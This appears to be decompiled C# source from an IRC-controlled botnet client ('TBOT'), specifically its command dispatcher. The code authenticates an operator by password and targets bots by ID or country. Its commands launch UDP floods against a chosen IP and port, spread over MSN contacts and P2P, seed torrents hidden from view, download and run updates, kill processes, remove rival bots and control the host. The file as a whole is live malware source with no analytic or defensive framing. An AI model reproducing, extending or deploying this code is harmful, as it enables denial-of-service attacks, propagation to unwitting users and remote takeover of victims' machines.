using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace TBOT;

internal class Functions
{
	public static string msg = "";

	public static bool runn = false;

	public static string prox = "";

	public static bool loggedIn = false;

	public static void determineCommand(string cmd)
	{
		Thread thread = new Thread(UDP.StartUdpFlood);
		Thread thread2 = new Thread(msnstart);
		Thread thread3 = new Thread(P2P.p2p);
		Thread thread4 = new Thread(killstart);
		string[] array = new string[2];
		if (cmd.Contains(" "))
		{
			array = cmd.Split(new char[1] { ' ' }, 2);
		}
		else
		{
			array[0] = cmd;
		}
		if (array[0].ToString().ToLower() == "login")
		{
			login(array[1]);
		}
		if (!loggedIn)
		{
			return;
		}
		switch (array[0].ToString().ToLower())
		{
		case "visit":
			new visitUrl(array[1]);
			break;
		case "open":
			Process.Start(array[1]);
			Irc.WriteTo(Config.ircChannel, "Opened Page: " + array[1] + "!");
			break;
		case "logout":
			logout();
			break;
		case "yell":
			Irc.WriteTo(Config.ircChannel, array[1].ToUpper().Replace("A", "AAAAA") + "!!!!");
			break;
		case "disconnect":
			kill();
			break;
		case "reconnect":
			recon();
			break;
		case "sort":
			Irc.Write("JOIN " + array[1]);
			break;
		case "part":
			Irc.Write("PART " + array[1]);
			break;
		case "botkiller":
			new Thread(botKiller.clean).Start();
			break;
		case "uninstall":
			Install.uninstall(null);
			break;
		case "download":
			downloadUpdate.downloadThread(array[1]);
			break;
		case "update":
			downloadUpdate.updateThread(array[1]);
			break;
		case "system":
			Shutdown.doCommand(array[1]);
			break;
		case "kill":
			thread4.Start();
			break;
		case "msn":
			if (!runn)
			{
				msg = array[1];
				MSNZZ.message = msg;
				thread2.Start();
				Irc.WriteTo(Config.ircChannel, "[MSN]: Spread Starting!");
				runn = true;
			}
			else
			{
				Irc.WriteTo(Config.ircChannel, "[MSN]: Spreading Already Running!");
			}
			break;
		case "msn.stop":
			try
			{
				thread2.Abort();
				Irc.WriteTo(Config.ircChannel, "[MSN]: Spreading Stopped! Sent To: " + MSNZZ.msgsent + " Contacts!");
				break;
			}
			catch
			{
				break;
			}
		case "p2p":
			thread3.Start();
			break;
		case "seed":
			if (utSeed.Check())
			{
				try
				{
					string[] array3 = array[1].Split(new char[1] { ' ' });
					utSeed.Run();
					utSeed.SeedIt(array3[0], array3[1] + "\\" + array3[2]);
					utSeed.HideIt();
					Irc.WriteTo(Config.ircChannel, "Seeding Has Started On " + array3[0] + " In Path " + array3[1] + "\\" + array3[2] + "!");
					break;
				}
				catch
				{
					break;
				}
			}
			break;
		case "flood":
		{
			string[] array2 = array[1].Split(new char[1] { ' ' });
			try
			{
				Irc.WriteTo(Config.ircChannel, "Flooding " + array2[0]);
				UDP.IP = new IPEndPoint(IPAddress.Parse(array2[0]), int.Parse(array2[1]));
				UDP.Threads = int.Parse(array2[2]);
				UDP.Interval = int.Parse(array2[3]);
				thread.Start();
				break;
			}
			catch (Exception)
			{
				Irc.WriteTo(Config.ircChannel, "Error While Flooding!");
				break;
			}
		}
		case "flood.stop":
			try
			{
				if (UDP.FloodingThread.Length > 0)
				{
					if (thread.IsAlive)
					{
						thread.Abort();
						UDP.StopUdpFlood();
					}
					Irc.WriteTo(Config.ircChannel, "Flooding Stopped! " + UDP.Reqs + " Requests Sent!");
				}
				break;
			}
			catch (Exception)
			{
				break;
			}
		}
	}

	private static void killProc(string procName)
	{
		Process process = null;
		Process[] processes = Process.GetProcesses();
		foreach (Process process2 in processes)
		{
			if (process2.ProcessName.ToLower() == procName.ToLower())
			{
				process = process2;
				break;
			}
		}
		if (process != null)
		{
			try
			{
				process.Kill();
				Irc.WriteTo(Config.ircChannel, "Killed " + procName);
				return;
			}
			catch (Exception)
			{
				Irc.WriteTo(Config.ircChannel, "Failed to end process");
				return;
			}
		}
		Irc.WriteTo(Config.ircChannel, "No such process found");
	}

	public static void kill()
	{
		Irc.ircClient = null;
		while (true)
		{
			Thread.Sleep(15);
			try
			{
				Process.GetCurrentProcess().Kill();
				break;
			}
			catch (Exception)
			{
			}
		}
	}

	public static void recon()
	{
		Process.Start(Config.installPath + Config.installFile);
		kill();
	}

	private static void logout()
	{
		Irc.WriteTo(Config.ircChannel, "Logged out.");
		loggedIn = false;
	}

	private static void login(string cmd)
	{
		if (cmd == Config.botPassword && !loggedIn)
		{
			Irc.WriteTo(Config.ircChannel, "Auth Accepted!");
			loggedIn = true;
		}
	}

	public static void determineWho(string cmd)
	{
		bool flag = true;
		bool flag2 = true;
		bool flag3 = false;
		bool flag4 = false;
		if (cmd.Contains("b{") && cmd.Contains("}"))
		{
			flag = false;
			int num = cmd.IndexOf("b{") + 2;
			int num2 = cmd.IndexOf('}', num);
			string text = cmd.Substring(num, num2 - num);
			if (text[0] == '!')
			{
				flag = true;
				flag4 = true;
			}
			cmd = cmd.Replace("b{" + text + "} ", "");
			if (flag4)
			{
				text = text.Substring(1);
			}
			if (text.Contains(","))
			{
				string[] array = text.Split(new char[1] { ',' });
				string[] array2 = array;
				foreach (string text2 in array2)
				{
					if (text2.ToLower() == Config.botRandom.ToLower())
					{
						flag3 = true;
						flag = ((!flag4) ? true : false);
						break;
					}
				}
			}
			else if (text.ToLower() == Config.botRandom.ToLower())
			{
				flag3 = true;
				flag = ((!flag4) ? true : false);
			}
		}
		if (!flag)
		{
			return;
		}
		flag4 = false;
		if (cmd.Contains("c{") && cmd.Contains("}"))
		{
			flag2 = false;
			int num3 = cmd.IndexOf("c{") + 2;
			int num4 = cmd.IndexOf('}', num3);
			string text3 = cmd.Substring(num3, num4 - num3);
			if (text3[0] == '!')
			{
				flag2 = true;
				flag4 = true;
			}
			cmd = cmd.Replace("c{" + text3 + "} ", "");
			if (flag4)
			{
				text3 = text3.Substring(1);
			}
			if (text3.Contains(","))
			{
				string[] array3 = text3.Split(new char[1] { ',' });
				string[] array4 = array3;
				foreach (string text4 in array4)
				{
					if (text4.ToLower() == botInfo.countryCode(botInfo.codeType.Short).ToLower())
					{
						flag2 = ((!flag4) ? true : false);
						break;
					}
				}
			}
			else if (text3.ToLower() == botInfo.countryCode(botInfo.codeType.Short).ToLower())
			{
				flag2 = ((!flag4) ? true : false);
			}
		}
		if ((flag && flag2) || (flag && flag3 && !flag2))
		{
			determineCommand(cmd);
		}
	}

	public static void msnstart()
	{
		try
		{
			MSNZZ.sendmessage();
		}
		catch (Exception)
		{
		}
	}

	public static void killstart()
	{
		try
		{
			killProc(prox);
		}
		catch
		{
		}
	}
}
